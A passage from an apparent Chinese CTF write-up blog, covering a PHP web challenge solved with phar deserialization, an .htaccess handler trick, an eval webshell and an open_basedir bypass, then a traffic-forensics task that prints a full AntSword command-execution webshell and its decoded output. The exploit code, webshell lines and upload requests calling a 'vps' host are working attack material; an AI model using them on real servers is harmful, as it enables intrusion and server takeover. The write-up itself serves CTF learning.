class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">.</span><span class="token string">' __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$o2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token operator">=</span><span class="token string">".."</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读取web根目录</span><span class="token variable">$o</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span><span class="token operator">=</span><span class="token variable">$o2</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span><span class="token string">"phar.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"gzip phar.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>上传+触发</p><pre class=" language-php"><code class="language-php">action<span class="token operator">=</span>upload<span class="token operator">&amp;</span>filename<span class="token operator">=</span>phar<span class="token punctuation">.</span>txt<span class="token operator">&amp;</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//vps/phar.txt.gz</span>action<span class="token operator">=</span>upload<span class="token operator">&amp;</span>filename<span class="token operator">=</span>xxx<span class="token operator">&amp;</span>url<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//upload/9616c713f6d1226cc55e987d1e2c6577/phar.txt</span></code></pre><p>拿到web根目录名</p><pre><code>your file in : upload/9616c713f6d1226cc55e987d1e2c6577your file in : . .. 25fc970c55766255your file in : ../</code></pre><h4 id="上传txt后门"><a href="#上传txt后门" class="headerlink" title="上传txt后门"></a>上传txt后门</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">dir</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$userdir</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'aaaaa'</span><span class="token punctuation">.</span><span class="token string">' __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$o</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">userdir</span> <span class="token operator">=</span> <span class="token string">'&lt;?php eval($_POST[a]);?>'</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"/var/www/html/f06110ef2e1e1ae1/upload/9616c713f6d1226cc55e987d1e2c6577/shell"</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string">"phar2.phar"</span><span class="token punctuation">,</span><span class="token string">"phar2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"gzip phar2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>上传+触发</p><pre class=" language-php"><code class="language-php">action<span class="token operator">=</span>upload<span class="token operator">&amp;</span>filename<span class="token operator">=</span>phar2<span class="token punctuation">.</span>txt<span class="token operator">&amp;</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//vps/phar2.txt.gz</span>action<span class="token operator">=</span>upload<span class="token operator">&amp;</span>filename<span class="token operator">=</span>xxx<span class="token operator">&amp;</span>url<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//upload/9616c713f6d1226cc55e987d1e2c6577/phar2.txt</span></code></pre><h4 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传.htaccess</h4><p>upload可以上传.htaccess，但是内容被限制了</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>参考<a href="https://www.freebuf.com/vuls/218495.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218495.html</a></p><pre class=" language-php"><code class="language-php">AddHandler php7<span class="token operator">-</span>script <span class="token punctuation">.</span>txt</code></pre><pre class=" language-php"><code class="language-php">action<span class="token operator">=</span>upload<span class="token operator">&amp;</span>filename<span class="token operator">=</span><span class="token punctuation">.</span>htaccess<span class="token operator">&amp;</span>url<span class="token operator">=</span>data<span class="token punctuation">:</span>image<span class="token operator">/</span>png<span class="token punctuation">;</span>base64<span class="token punctuation">,</span>QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0</code></pre><h4 id="绕过basedir"><a href="#绕过basedir" class="headerlink" title="绕过basedir"></a>绕过basedir</h4><p>最后读目录,flag</p><pre class=" language-php"><code class="language-php"><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-php"><code class="language-php">a<span class="token operator">=</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'F1aG_1s_H4r4'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="官方解法"><a href="#官方解法" class="headerlink" title="官方解法"></a>官方解法</h4><p>读目录 通过glob://协议</p><pre class=" language-php"><code class="language-php">action<span class="token operator">=</span>count<span class="token operator">&amp;</span>url<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>dir<span class="token operator">=</span>glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/*/upload/{your_upload_path}/*</span></code></pre><p>写后门 通过构造文件名 </p><pre class=" language-php"><code class="language-php">action<span class="token operator">=</span>upload<span class="token operator">&amp;</span>url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//xxx&amp;filename=&lt;?php echo 1.1;eval($_GET["a"]);</span></code></pre><p>再通过phar反序列化触发 tostring 将带有后门语句的文件名写入txt</p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phar反序列化 </tag>
            
            <tag> 伪静态文件 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高校运维赛 writeup</title>
      <link href="/2019/11/21/writeup/gao-xiao-yun-wei-sai-writeup/"/>
      <url>/2019/11/21/writeup/gao-xiao-yun-wei-sai-writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>当过滤条件为<code>tcp.stream eq 7</code>时,shell.php执行<code>cat flag|base64</code>,还带有回显的加密方法</p><pre><code>L2Jpbi9zaA==Y2QgIi92YXIvd3d3L2h0bWwvdG1wIjtjYXQgZmxhZ3xiYXNlNjQgO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ==&quot;cd &quot;/var/www/html/tmp&quot;;cat flag|base64 ;echo [S];pwd;echo [E]&quot;</code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token string">'f5045b05abe6ec9b1e37fafa851f5de9'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> @<span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'AES-128-ECB'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token constant">OPENSSL_RAW_DATA</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$output</span><span class="token operator">=</span><span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"0897d"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"60c97"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$p</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"0xc461e86196f1a"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// /bin/sh</span>    <span class="token variable">$s</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"0x9ec3fa98a283f"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// cd "/var/www/html/tmp";cd /var/www/html/tmp/;echo [S];pwd;echo [E]</span>    <span class="token variable">$d</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"/"</span><span class="token operator">?</span><span class="token string">"-c \"{$s}\""</span><span class="token punctuation">:</span><span class="token string">"/c \"{$s}\""</span><span class="token punctuation">;</span>    <span class="token variable">$r</span><span class="token operator">=</span><span class="token string">"{$p} {$c}"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">fe</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$d</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span>@<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">"disable_functions"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$d</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'trim'</span><span class="token punctuation">,</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string">'strtolower'</span><span class="token punctuation">,</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">runcmd</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$ret</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>@<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$fp</span><span class="token operator">=</span>@<span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">print</span><span class="token punctuation">(</span>@<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>@<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">fe</span><span class="token punctuation">(</span><span class="token string">'antsystem'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>@<span class="token function">antsystem</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token variable">$ret</span><span class="token operator">=</span>@<span class="token function">runcmd</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">.</span><span class="token string">" 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">"ret={$ret}"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> "<span class="token constant">ERROR</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">//".$e->getMessage();</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>回显如下</p><pre><code>8c2b4_kRD1eD+vSZ81FAJ6XClabCR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dZOTFg4DW9MYwG6k3rEvAAR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJHygVK0ad8xG1Qk6pzSaCiR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJ1qI47Cz1/qfnNoNARGhLfVhC0RJlfeKCvbPwpjFn//BSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93FIVjxEmVnLHPVr5M/LQPdxSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93GnMvJfVbvphfWnt17IOkzYjvv91k2fnYDR7u4nlGM3YitxGYGs9mn+HS5iJBXORtYrcRmBrPZp/h0uYiQVzkbWK3EZgaz2af4dLmIkFc5G1itxGYGs9mn+HS5iJBXORtUq4dBjDRFhDqDyzs9CScJhrd3yMusQ+qsnZkq4Ey7NVJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l2hDPuDhVN4TaDLzp9bXyfGeCVhvglAaNo2rA/ovnRTTtfA5ZywMOOijj6md5RItqjXwOWcsDDjoo4+pneUSLao18DlnLAw46KOPqZ3lEi2qNfA5ZywMOOijj6md5RItqgS0b9hS7r5TX9YNZo2awgUAyqVacVgwr1NlNQ2k/kihhh0QQfnjeGdZhkz0N0jAKiMzFmAMa7xQ1URxTaHoHjDg3NaWl/8+PVG+pyaKrbNDjfl77POeQE8+0MCHpz6YxWLJ6mwCe1X3uzz/HSHcHSvQBB8FxjOhugOErOXkd3LZi/60Gr4gIEc1JIxA5A2pE/V6Z/DFwNOR4M/IIIWdGr5_e2e10</code></pre><p>去掉头尾</p><p>解密</p><pre><code>YmFiYWJhYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmIKaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGgKaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGgKZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2cKYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmIKbm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm4KZmxhZ3tBbnRTd29yZF9pc19Qb3dlcmZ1bF8zMjIyMjIyISEhIX0K[S]/var/www/html/tmp[E]Cg</code></pre><pre><code>babababbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhgggggggggggggggggggggggggggggggggggggggggggggggggggggggggggbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnflag{AntSword_is_Powerful_3222222!!!!}</code></pre><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> os<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flasksecret <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'015b9efef8f51c00bcba57ca8c56d77a'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/r"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> os<span 